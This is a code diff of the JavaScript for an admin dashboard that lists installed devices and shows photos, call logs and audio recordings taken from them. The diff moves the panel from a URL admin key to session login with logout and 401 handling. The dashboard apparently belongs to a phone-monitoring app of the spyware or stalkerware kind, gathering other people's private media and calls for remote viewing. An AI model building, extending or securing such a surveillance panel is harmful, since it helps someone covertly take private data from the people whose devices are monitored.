@@ -1,13 +1,20 @@
-const params = new URLSearchParams(location.search);
-let KEY = params.get('key') || prompt('Admin key:') || '';
-if (!params.get('key') && KEY) location.search = '?key=' + encodeURIComponent(KEY);
+/* if any request returns 401, kick back to login */
+function handleAuth(res) {
+  if (res.status === 401) {
+    location.href = '/login.html';
+    throw new Error('unauthorized');
+  }
+  return res.json();
+}
 
-const api = p => fetch(p, { headers: { 'X-Admin-Key': KEY } }).then(r => r.json());
+const api = p => fetch(p).then(handleAuth);
+
 let currentDevice = null;
 let currentTab = 'photos';
 
 async function loadDevices() {
-  const d = await api('/api/admin/devices');
+  let d;
+  try { d = await api('/api/admin/devices'); } catch (_) { return; }
   const el = document.getElementById('deviceList');
   if (!d.length) {
     el.innerHTML = '<div class="loading">No devices yet.<br>Install the app to see it here.</div>';
@@ -26,7 +33,8 @@ async function loadDevices() {
 function selectDevice(id) { currentDevice = id; loadDevices(); renderDevice(id); }
 
 async function renderDevice(id) {
-  const info = await api(`/api/admin/device/${id}`);
+  let info;
+  try { info = await api(`/api/admin/device/${id}`); } catch (_) { return; }
   if (!info.device) return;
   document.getElementById('main').innerHTML = `
     <div class="header">
@@ -65,14 +73,14 @@ async function renderTab(id) {
   const el = document.getElementById('tabContent');
   el.innerHTML = '<div class="empty-list">Loading...</div>';
   let data = [];
-  try { data = await api(`/api/admin/device/${id}/${currentTab}`); } catch(_) {}
+  try { data = await api(`/api/admin/device/${id}/${currentTab}`); } catch (_) { return; }
   if (!Array.isArray(data)) data = [];
 
   if (currentTab === 'photos') {
     if (!data.length) return el.innerHTML = '<div class="empty-list">No photos yet.</div>';
     el.innerHTML = `<div class="grid-photos">${data.map(p => `
-      <div class="photo" onclick="window.open('/files/${p.filename}?key=${encodeURIComponent(KEY)}','_blank')">
-        <img src="/files/${p.filename}?key=${encodeURIComponent(KEY)}" loading="lazy">
+      <div class="photo" onclick="window.open('/files/${p.filename}','_blank')">
+        <img src="/files/${p.filename}" loading="lazy">
       </div>`).join('')}</div>`;
   } else if (currentTab === 'calls') {
     if (!data.length) return el.innerHTML = '<div class="empty-list">No calls yet.</div>';
@@ -117,7 +125,7 @@ async function renderTab(id) {
           <div class="dur">${fmtDur(r.duration)}</div>
           <div class="when" style="margin-left:auto;">${fmtDate(r.ts)}</div>
         </div>
-        <audio controls src="/files/${r.path}?key=${encodeURIComponent(KEY)}"></audio>
+        <audio controls src="/files/${r.path}"></audio>
       </div>`).join('')}</div>`;
   }
 }
@@ -148,6 +156,15 @@ function escapeHtml(s) {
   }[c]));
 }
 
-setInterval(() => { if (currentDevice) renderTab(currentDevice); }, 15000);
-setInterval(loadDevices, 20000);
-loadDevices();
+document.getElementById('logoutBtn').addEventListener('click', async () => {
+  await fetch('/api/logout', { method: 'POST' });
+  location.href = '/login.html';
+});
+
+/* check we're logged in before loading */
+fetch('/api/me').then(r => r.json()).then(d => {
+  if (!d.loggedIn) { location.href = '/login.html'; return; }
+  loadDevices();
+  setInterval(() => { if (currentDevice) renderTab(currentDevice); }, 15000);
+  setInterval(loadDevices, 20000);
+});
